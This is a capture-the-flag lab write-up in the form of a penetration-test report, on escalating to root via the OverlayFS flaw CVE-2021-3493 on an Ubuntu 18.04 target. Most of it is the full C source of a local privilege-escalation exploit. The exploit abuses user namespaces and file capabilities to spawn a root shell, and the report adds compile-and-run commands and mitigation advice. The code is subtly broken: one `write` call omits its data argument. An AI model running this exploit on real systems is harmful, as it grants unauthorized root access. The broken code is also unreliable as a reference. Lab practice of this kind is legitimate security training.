# Vulnerability Assessment and Penetration Testing (VAPT) Report – OverlayFS Exploit Lab

**Prepared by:** Nishanth Antony  
**Date:** August 25, 2025  
**Difficulty:** Easy  
**Category:** Privilege Escalation  
**Platform:** Try Hack Me(THM) 

---

## 1. Reconnaissance Steps  
**Objective:** Confirm target availability and establish initial access.  
**Commands Used:**  
- `ping <ip_addr>`  

**Findings:**  
- Host confirmed online via ping.  
- Provided SSH credentials for user "overlay" enabled initial access.  
- Target system identified as Ubuntu 18.04 Server with OverlayFS vulnerability (CVE-2021-3493).  

---

## 2. Exploitation Process  
**Step 1 – Initial Access via SSH**  
- Logged into the target machine using provided credentials:  
  `ssh overlay@<ip_addr>`  
- Outcome: Obtained a shell as the "overlay" user.  

**Step 2 – Exploit Development**  
- Created `exploit.c` based on the SSD-Disclosure PoC:  
  ```cpp
  #define _GNU_SOURCE
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <err.h>
  #include <errno.h>
  #include <sched.h>
  #include <sys/types.h>
  #include <sys/stat.h>
  #include <sys/wait.h>
  #include <sys/mount.h>
  int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
  #define DIR_BASE "./ovlcap"
  #define DIR_WORK DIR_BASE "/work"
  #define DIR_LOWER DIR_BASE "/lower"
  #define DIR_UPPER DIR_BASE "/upper"
  #define DIR_MERGE DIR_BASE "/merge"
  #define BIN_MERGE DIR_MERGE "/magic"
  #define BIN_UPPER DIR_UPPER "/magic"
  static void xmkdir(const char *path, mode_t mode)
  {
      if (mkdir(path, mode) == -1 && errno != EEXIST)
          err(1, "mkdir %s", path);
  }
  static void xwritefile(const char *path, const char *data)
  {
      int fd = open(path, O_WRONLY);
      if (fd == -1)
          err(1, "open %s", path);
      ssize_t len = (ssize_t) strlen(data);
      if (write(fd, len) != len)
          err(1, "write %s", path);
      close(fd);
  }
  static void xcopyfile(const char *src, const char *dst, mode_t mode)
  {
      int fi, fo;
      if ((fi = open(src, O_RDONLY)) == -1)
          err(1, "open %s", src);
      if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
          err(1, "open %s", dst);
      char buf[4096];
      ssize_t rd, wr;
      for (;;) {
          rd = read(fi, buf, sizeof(buf));
          if (rd == 0) {
              break;
          } else if (rd == -1) {
              if (errno == EINTR)
                  continue;
              err(1, "read %s", src);
          }
          char *p = buf;
          while (rd > 0) {
              wr = write(fo, p, rd);
              if (wr == -1) {
                  if (errno == EINTR)
                      continue;
                  err(1, "write %s", dst);
              }
              p += wr;
              rd -= wr;
          }
      }
      close(fi);
      close(fo);
  }
  static int exploit()
  {
      char buf[4096];
      sprintf(buf, "rm -rf '%s/'", DIR_BASE);
      system(buf);
      xmkdir(DIR_BASE, 0777);
      xmkdir(DIR_WORK, 0777);
      xmkdir(DIR_LOWER, 0777);
      xmkdir(DIR_UPPER, 0777);
      xmkdir(DIR_MERGE, 0777);
      uid_t uid = getuid();
      gid_t gid = getgid();
      if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
          err(1, "unshare");
      xwritefile("/proc/self/setgroups", "deny");
      sprintf(buf, "0 %d 1", uid);
      xwritefile("/proc/self/uid_map", buf);
      sprintf(buf, "0 %d 1", gid);
      xwritefile("/proc/self/gid_map", buf);
      sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
      if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
          err(1, "mount %s", DIR_MERGE);
      char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
      xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
      if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
          err(1, "setxattr %s", BIN_MERGE);
      return 0;
  }
  int main(int argc, char *argv[])
  {
      if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
          setuid(0);
          setgid(0);
          execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
          err(1, "execl /bin/bash");
      }
      pid_t child = fork();
      if (child == -1)
          err(1, "fork");
      if (child == 0) {
          _exit(exploit());
      } else {
          waitpid(child, NULL, 0);
      }
      execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
      err(1, "execl %s", BIN_UPPER);
  }
  ```
- Outcome: Exploit file ready for compilation and execution.  

**Step 3 – Exploit Compilation and Execution**  
- Compiled the exploit:  
  `gcc exploit.c -o exploit`  
- Executed the binary:  
  `./exploit`  
- Outcome: Spawned a root shell (UID 0).  

**Step 4 – Post-Exploitation**  
- Navigated to `/root` and retrieved the flag:  
  `cd /root`  
  `cat flag.txt`  
- Outcome: Successfully retrieved the flag.  

---

## 3. Proof of Concept (PoC)  
- **Exploit Execution:**  
  - Compiled and ran:  
    ```bash
    gcc exploit.c -o exploit
    ./exploit
    ```
  - Resulted in a root shell, enabling access to `/root/flag.txt`.  

---

## 4. Privilege Escalation  
- Exploited OverlayFS vulnerability (CVE-2021-3493) to escalate from "overlay" user to root.  
- Used user namespace manipulation and capability setting to gain root privileges.  

---

## 5. Mitigation Recommendations  
- **Kernel Patching:**  
  - Apply Ubuntu security patches addressing CVE-2021-3493.  
  - Regularly monitor advisories from SSD-Disclosure.  
- **Disable Unnecessary Modules:**  
  - Disable OverlayFS if not required to reduce attack surface.  
- **Restrict User Namespaces:**  
  - Set `kernel.unprivileged_userns_clone=0` to prevent similar exploits.  
- **Strong Authentication:**  
  - Use complex passwords and multi-factor authentication (MFA) for SSH.  
- **Binary Execution Controls:**  
  - Implement AppArmor or SELinux to restrict binary execution.  
- **File System Security:**  
  - Enforce strict permissions on sensitive directories (e.g., `/root`).  

---

## 6. Lessons Learned  
- **Kernel Vulnerabilities:** OverlayFS misconfigurations can lead to privilege escalation.  
- **Namespace Exploitation:** Unprivileged user namespaces are a potential attack vector.  
- **System Hardening:** Regular updates and access controls are critical to prevent such exploits.  

---

## 7. Skills Practiced  
- Network reconnaissance (ping)  
- SSH access and privilege escalation  
- Exploit development and compilation (C, gcc)  
- Kernel vulnerability exploitation (OverlayFS)  
- Secure reporting and mitigation strategies  
